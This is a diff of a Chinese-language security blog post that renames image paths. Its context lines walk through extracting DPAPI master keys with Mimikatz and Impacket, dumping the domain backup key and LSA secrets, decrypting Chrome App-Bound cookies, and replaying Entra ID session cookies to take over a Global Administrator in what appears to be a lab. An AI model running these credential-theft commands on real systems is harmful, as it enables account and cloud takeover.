@@ -58,7 +58,7 @@ DPAPI 使用一种称为“基于密码的密钥派生”（Password-Based Key D
 
 对于用户来说，其 Master Key file 位于 `%APPDATA%\Microsoft\Protect\<sid>` 目录下，其中 {SID} 是该用户的 Security Identifier。
 
-![image-20250928185115272](/assets/posts/2025-09-30-a-journey-into-dpapi-and-chrome-theft/image-20250928185115272.png)
+![image-20250928185115272](/assets/posts/2025-09-30-from-dpapi-to-chrome-a-journey-to-entra-id-takeover/image-20250928185115272.png)
 
 > 由于该目录下的相关文件被作为系统文件永久隐藏，因此需要通过 Powershell 的 `Get-ChildItem -Hidden` 或 `dir /a ` 命令来列出。
 
@@ -70,7 +70,7 @@ DPAPI_SYSTEM 是一个只有 SYSTEM 用户才能访问的特殊密钥，存放�
 
 对于机器/系统里说，其 Master Key file 位于在 `%WINDIR%\System32\Microsoft\Protect\S-1-5-18\User` 目录下。
 
-![image-20250928185446738](/assets/posts/2025-09-30-a-journey-into-dpapi-and-chrome-theft/image-20250928185446738.png)
+![image-20250928185446738](/assets/posts/2025-09-30-from-dpapi-to-chrome-a-journey-to-entra-id-takeover/image-20250928185446738.png)
 
 > 由于该目录下的相关文件被作为系统文件永久隐藏，因此需要通过 Powershell 的 `Get-ChildItem -Hidden` 或 `dir /a ` 命令来列出。
 
@@ -111,9 +111,9 @@ privilege::debug
 sekurlsa::dpapi
 ```
 
-![image-20250929114003087](/assets/posts/2025-09-30-a-journey-into-dpapi-and-chrome-theft/image-20250929114003087.png)
+![image-20250929114003087](/assets/posts/2025-09-30-from-dpapi-to-chrome-a-journey-to-entra-id-takeover/image-20250929114003087.png)
 
-![image-20250929114422232](/assets/posts/2025-09-30-a-journey-into-dpapi-and-chrome-theft/image-20250929114422232.png)
+![image-20250929114422232](/assets/posts/2025-09-30-from-dpapi-to-chrome-a-journey-to-entra-id-takeover/image-20250929114422232.png)
 
 如上图所示，成功导出 4 个 MasterKey。其中，david.lewis 用户的会话中存在一个 MasterKey，计算机 账户 ITWS-DLEWIS$ 中存在 3 个 MasterKey。
 
@@ -133,7 +133,7 @@ sekurlsa::dpapi
 dpapi::masterkey /in:"<Path to MASTER_KEY_FILE>" /sid:"<USER_SID>" /password:"<USER_PASSWORD>" /protected
 ```
 
-![image-20250929122100356](/assets/posts/2025-09-30-a-journey-into-dpapi-and-chrome-theft/image-20250929122100356.png)
+![image-20250929122100356](/assets/posts/2025-09-30-from-dpapi-to-chrome-a-journey-to-entra-id-takeover/image-20250929122100356.png)
 
 如果是目标用户为域用户，也可以使用其密码的哈希值进行解密：
 
@@ -141,7 +141,7 @@ dpapi::masterkey /in:"<Path to MASTER_KEY_FILE>" /sid:"<USER_SID>" /password:"<U
 dpapi::masterkey /in:"<Path to MASTER_KEY_FILE>" /sid:"<USER_SID>" /hash:"<USER_NTLM_HASH>" /protected
 ```
 
-![image-20250929122525849](/assets/posts/2025-09-30-a-journey-into-dpapi-and-chrome-theft/image-20250929122525849.png)
+![image-20250929122525849](/assets/posts/2025-09-30-from-dpapi-to-chrome-a-journey-to-entra-id-takeover/image-20250929122525849.png)
 
 此外，也可以通过 Impacket 套件中的 dpapi.py 脚本进行解密：
 
@@ -150,7 +150,7 @@ dpapi::masterkey /in:"<Path to MASTER_KEY_FILE>" /sid:"<USER_SID>" /hash:"<USER_
 impacket-dpapi masterkey -file '<Path to MASTER_KEY_FILE>' -sid '<USER_SID>' -password '<USER_PASSWORD>'
 ```
 
-![Snipaste_2025-09-29_00-40-26](/assets/posts/2025-09-30-a-journey-into-dpapi-and-chrome-theft/Snipaste_2025-09-29_00-40-26-9121059.png)
+![Snipaste_2025-09-29_00-40-26](/assets/posts/2025-09-30-from-dpapi-to-chrome-a-journey-to-entra-id-takeover/Snipaste_2025-09-29_00-40-26-9121059.png)
 
 ### Using Domain Backup Key
 
@@ -162,7 +162,7 @@ impacket-dpapi masterkey -file '<Path to MASTER_KEY_FILE>' -sid '<USER_SID>' -pa
 lsadump::backupkeys /system:"<Domain Controller>" /export
 ```
 
-![image-20250929125856616](/assets/posts/2025-09-30-a-journey-into-dpapi-and-chrome-theft/image-20250929125856616.png)
+![image-20250929125856616](/assets/posts/2025-09-30-from-dpapi-to-chrome-a-journey-to-entra-id-takeover/image-20250929125856616.png)
 
 如上图所示，转储过程会生成 3 个不同后缀命名的文件，其中最重要的就是 `*.pvk` 文件。`.pvk` 扩展名也有“私钥“的意思。
 
@@ -172,9 +172,9 @@ lsadump::backupkeys /system:"<Domain Controller>" /export
 dpapi::masterkey /in:"<Path to MASTER_KEY_FILE>" /pvk:"<Path to DOMAIN_BACKUP_KEY_EXPORT_PVK_FILE>"
 ```
 
-![image-20250929130144766](/assets/posts/2025-09-30-a-journey-into-dpapi-and-chrome-theft/image-20250929130144766.png)
+![image-20250929130144766](/assets/posts/2025-09-30-from-dpapi-to-chrome-a-journey-to-entra-id-takeover/image-20250929130144766.png)
 
-![image-20250929130228571](/assets/posts/2025-09-30-a-journey-into-dpapi-and-chrome-theft/image-20250929130228571.png)
+![image-20250929130228571](/assets/posts/2025-09-30-from-dpapi-to-chrome-a-journey-to-entra-id-takeover/image-20250929130228571.png)
 
 此外，也可以通过 Impacket 套件中的 dpapi.py 脚本进行操作：
 
@@ -185,7 +185,7 @@ impacket-dpapi backupkeys -t offseclabs.tech/Administrator@srvad01.offseclabs.te
 impacket-dpapi masterkey -file '<Path to MASTER_KEY_FILE>' -pvk '<Path to DOMAIN_BACKUP_KEY_EXPORT_PVK_FILE>'
 ```
 
-![image-20250929131107931](/assets/posts/2025-09-30-a-journey-into-dpapi-and-chrome-theft/image-20250929131107931.png)
+![image-20250929131107931](/assets/posts/2025-09-30-from-dpapi-to-chrome-a-journey-to-entra-id-takeover/image-20250929131107931.png)
 
 # Decrypt DPAPI-protected Data
 
@@ -203,7 +203,7 @@ Windows 凭据管理器（Credential Manager）是操作系统提供的一个安
 dpapi::cred /in:".\Credentials\088E944D53AA5325DEBB316DAD22B476"
 ```
 
-![image-20250929133524010](/assets/posts/2025-09-30-a-journey-into-dpapi-and-chrome-theft/image-20250929133524010.png)
+![image-20250929133524010](/assets/posts/2025-09-30-from-dpapi-to-chrome-a-journey-to-entra-id-takeover/image-20250929133524010.png)
 
 从返回的结果中可以看到，该凭据受到 GUID 为 {d50af38c-3c43-4c36-9a32-3dc81a133f83} 的 MasterKey 保护，正是我们前文已解密成功的那个。
 
@@ -213,7 +213,7 @@ dpapi::cred /in:".\Credentials\088E944D53AA5325DEBB316DAD22B476"
 dpapi::cred /in:".\Credentials\088E944D53AA5325DEBB316DAD22B476" /masterkey:"f7207dc067794eca1d528ce941e63fa37670566c9770c56692a04462df41ce462266eb784037d396238f5c54fc0adf586d568bd1acc827beda452220ad83883b"
 ```
 
-![image-20250929133941577](/assets/posts/2025-09-30-a-journey-into-dpapi-and-chrome-theft/image-20250929133941577.png)
+![image-20250929133941577](/assets/posts/2025-09-30-from-dpapi-to-chrome-a-journey-to-entra-id-takeover/image-20250929133941577.png)
 
 ## Decrypting Browser Cookies
 
@@ -234,7 +234,7 @@ dpapi::cred /in:".\Credentials\088E944D53AA5325DEBB316DAD22B476" /masterkey:"f72
 
 在 Chrome 127 版本发布之后，所有存储在 Cookies 数据库中的加密 Cookie 值开头标识由原来的 `v10` 更新为 `v20`，这标志着加密机制发生了重要变化。Google 开发团队在 Chrome 浏览器中引入了一种新的保护机制，它相较于传统的 DPAPI 进行了改进，提供了基于应用绑定的加密原语（App-Bound Encryption）。与过去任何以登录用户身份运行的应用都能访问这些数据不同，现在 Chrome 可以将数据加密与应用身份绑定在一起，这与 macOS 上的 Keychain 工作方式类似。
 
-![img](/assets/posts/2025-09-30-a-journey-into-dpapi-and-chrome-theft/Screenshot 2024-07-26 2.15.06 PM.png)App‑Bound 加密依赖一个特权服务来验证发起请求的应用程序身份。在加密时，App‑Bound 加密服务会将应用的身份编码进加密数据中，并在尝试解密时验证该身份的有效性。如果系统上的另一个应用尝试解密同一份数据，解密将会失败。由于 App‑Bound 服务以系统权限运行，攻击者不能仅仅通过诱导用户运行恶意程序来获得数据访问权，他们现在必须获得系统级权限，或注入 Chrome 注入进程。
+![img](/assets/posts/2025-09-30-from-dpapi-to-chrome-a-journey-to-entra-id-takeover/Screenshot 2024-07-26 2.15.06 PM.png)App‑Bound 加密依赖一个特权服务来验证发起请求的应用程序身份。在加密时，App‑Bound 加密服务会将应用的身份编码进加密数据中，并在尝试解密时验证该身份的有效性。如果系统上的另一个应用尝试解密同一份数据，解密将会失败。由于 App‑Bound 服务以系统权限运行，攻击者不能仅仅通过诱导用户运行恶意程序来获得数据访问权，他们现在必须获得系统级权限，或注入 Chrome 注入进程。
 
 在启用 App-Bound 保护后，Local State 文件仍然包含用于解密所有 Cookie 值的密钥，虽然 `os_crypt.encrypted_key` 字段仍保留，但这次 AES 密钥（后续我们称作 “App-Bound Key“）经过保护后被保存在 `os_crypt.app_bound_encrypted_key` 字段中。此外，区别于之前 AES 密钥的单次 DPAPI 保护方式，这次使用了 3 轮保护：
 
@@ -316,7 +316,7 @@ with open("app_bound_encrypted_key.bin", "wb") as w:
 dpapi::blob /in:".\app_bound_encrypted_key.bin"
 ```
 
-![image-20250929195549876](/assets/posts/2025-09-30-a-journey-into-dpapi-and-chrome-theft/image-20250929195549876.png)
+![image-20250929195549876](/assets/posts/2025-09-30-from-dpapi-to-chrome-a-journey-to-entra-id-takeover/image-20250929195549876.png)
 
 从返回的结果中可以看到，该 Data BLOB 受到 GUID 为 {bc01a1a5-999c-4652-bc65-9e3c79ebcce5} 的机器/系统 MasterKey 保护，接下来需要解密这个机器/系统 MasterKey。
 
@@ -333,7 +333,7 @@ reg save HKLM\SECURITY SECURITY
 lsadump::secrets /system:SYSTEM /security:SECURITY
 ```
 
-![image-20250929194411597](/assets/posts/2025-09-30-a-journey-into-dpapi-and-chrome-theft/image-20250929194411597.png)
+![image-20250929194411597](/assets/posts/2025-09-30-from-dpapi-to-chrome-a-journey-to-entra-id-takeover/image-20250929194411597.png)
 
 上图中可以看到，DPAPI_SYSTEM 值（full）包含两部分，前半段 “1e6ea4d324c446648c024c4ad301049628bccf60” 被称为机器密钥（Machine Key），后半段 “b08b821574f1020edbc98883ba3ddf012714ed66” 被称为用户密钥（User Key），后者一般用来加密机器/系统的 Master Key。
 
@@ -343,7 +343,7 @@ lsadump::secrets /system:SYSTEM /security:SECURITY
 dpapi::masterkey /in:"bc01a1a5-999c-4652-bc65-9e3c79ebcce5" /system:"1e6ea4d324c446648c024c4ad301049628bccf60b08b821574f1020edbc98883ba3ddf012714ed66" /protected
 ```
 
-![image-20250929195241887](/assets/posts/2025-09-30-a-journey-into-dpapi-and-chrome-theft/image-20250929195241887.png)
+![image-20250929195241887](/assets/posts/2025-09-30-from-dpapi-to-chrome-a-journey-to-entra-id-takeover/image-20250929195241887.png)
 
 （5）通过得到的机器/系统 MasterKey 解密 “app_bound_encrypted_key.bin” 中的 Data BLOB。
 
@@ -351,7 +351,7 @@ dpapi::masterkey /in:"bc01a1a5-999c-4652-bc65-9e3c79ebcce5" /system:"1e6ea4d324c
 dpapi::blob /in:".\app_bound_encrypted_key.bin" /masterkey:"9d9a733d63da3b0759c15a6c70bdad83fd39a333238399acbbda2963049a971931f2b6e25df0c1288e3ef0d5cc1195712421134d66d043b937c8de867938fc66"
 ```
 
-![image-20250929195925370](/assets/posts/2025-09-30-a-journey-into-dpapi-and-chrome-theft/image-20250929195925370.png)
+![image-20250929195925370](/assets/posts/2025-09-30-from-dpapi-to-chrome-a-journey-to-entra-id-takeover/image-20250929195925370.png)
 
 如上图所示，返回结果中的 `data` 部分就是第一次解密得到的数据，我们将其以 BLOB 的格式提取到 “decrypted_blob_1.bin” 文件中。
 
@@ -363,7 +363,7 @@ dpapi::blob /in:".\decrypted_blob_1.bin" /masterkey:"f7207dc067794eca1d528ce941e
 
 > 这里省去了分析 “decrypted_blob_1.txt” 的过程，因为该用户只有这一个 MasterKey，并在前文中我们已掌握。
 
-![image-20250929202158541](/assets/posts/2025-09-30-a-journey-into-dpapi-and-chrome-theft/image-20250929202158541.png)
+![image-20250929202158541](/assets/posts/2025-09-30-from-dpapi-to-chrome-a-journey-to-entra-id-takeover/image-20250929202158541.png)
 
 如上图所示，返回结果中的 `data` 部分就是第二次解密得到的数据。我们可以将其转换为 Hexdump 的格式：
 
@@ -577,7 +577,7 @@ catch {
 }
 ```
 
-![image-20250930160009083](/assets/posts/2025-09-30-a-journey-into-dpapi-and-chrome-theft/image-20250930160009083.png)
+![image-20250930160009083](/assets/posts/2025-09-30-from-dpapi-to-chrome-a-journey-to-entra-id-takeover/image-20250930160009083.png)
 
 （8）最后，编写以下 Python 脚本，将上一步获取到的 `aes_key` 的值作为密钥，通过 `AES-256-GCM` 的算法对 CIPHERTEXT 部分进行解密（还需要用到 VI 和 TAG 部分），得到最终用来解密 Cookies 的 “App‑Bound Key”。接着，读取 `Cookies` 数据库文件中的 Cookies 并使用 “App-Bound Key” 进行解密。
 
@@ -687,13 +687,13 @@ if __name__ == "__main__":
 
 解密完成的 Cookies 会以 JSON 格式保存在 cookies.json 文件中，如下图所示：
 
-![image-20250930171603487](/assets/posts/2025-09-30-a-journey-into-dpapi-and-chrome-theft/image-20250930171603487.png)
+![image-20250930171603487](/assets/posts/2025-09-30-from-dpapi-to-chrome-a-journey-to-entra-id-takeover/image-20250930171603487.png)
 
 在本案例中，为登录 OffsecLabs 组织的 Microsoft Entra ID，我们重点关注的认证 Cookie 包括 ESTSAUTH、ESTSAUTHPERSISTENT 与 ESTSAUTHLIGHT，这些 Cookie 表明对应用户最近在其 Azure 云资产上有过活动。
 
 因此，只需访问 login.microsoftonline.com 并注入 ESTSAUTHPERSISTENT 或 ESTSAUTH 等认证 Cookie，即可完成会话恢复并获得对目标会话的身份验证。如下图所示，最终成功以 Global Administrator 身份接管其 Microsoft Entra ID。
 
-![Animation](/assets/posts/2025-09-30-a-journey-into-dpapi-and-chrome-theft/Animation.gif)
+![Animation](/assets/posts/2025-09-30-from-dpapi-to-chrome-a-journey-to-entra-id-takeover/Animation.gif)
 
 # References
 
